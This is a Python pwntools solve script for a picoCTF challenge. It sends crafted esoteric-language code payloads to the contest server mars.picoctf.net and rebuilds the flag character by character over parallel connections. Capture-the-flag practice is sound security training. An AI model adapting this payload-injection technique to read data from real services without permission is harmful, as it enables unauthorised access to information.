#!/usr/bin/env python3
from pwn import *
from concurrent.futures import ThreadPoolExecutor

data_codes = [
        "0", "0!", "0!:+", "0!::++", "0!:+:+", 
        "0!::+:++", "0!:+::++", "0!::+::+++", "0!:+:+:+", 
        "0!::++:*", "0!::+:++:+", "0!:::+:++:++", 
        "0!:+::++:+", "0!::+::++:++", "0!::+::+++:+", 
        "0!::+:++::++", "0!:+:*:*", "0!::+:*:*+", 
        "0!::++:*:+", "0!:::++:*:++", "0!::+:++:+:+", 
        "0!:::+:++:+:++"
]

def assemble_payload(col_index, row_index):
    initial_payload = b"0!::+::+++:*0!+:00!-v\n"
    formatted_code = f"\\0\\p{data_codes[row_index]:A<14}+v>\n".encode()
    target_data = f"{data_codes[col_index]:A<14}\\g,@A>A\n".encode()

    return initial_payload + formatted_code + target_data + b"\n"

def transmit_request(col_index, row_index):
    connection = remote("mars.picoctf.net", 31689)
    connection.recvline()

    payload = assemble_payload(col_index, row_index)
    print(payload.decode())

    connection.send(payload)
    return connection.recvall().decode()[-1]

def execute_requests():
    output = ""
    with ThreadPoolExecutor(max_workers=10) as executor:
        task_futures = []
        for col_index in range(8, 0x16):
            task_futures.append(executor.submit(transmit_request, col_index, 2))
        for col_index in range(0x16):
            task_futures.append(executor.submit(transmit_request, col_index, 3))
        for col_index in range(0x16):
            task_futures.append(executor.submit(transmit_request, col_index, 4))
        for future in task_futures:
            output += future.result()
    print("[+] Flag Successfully retrieved! Here it is master:")
    print(output)

if __name__ == "__main__":
    execute_requests()
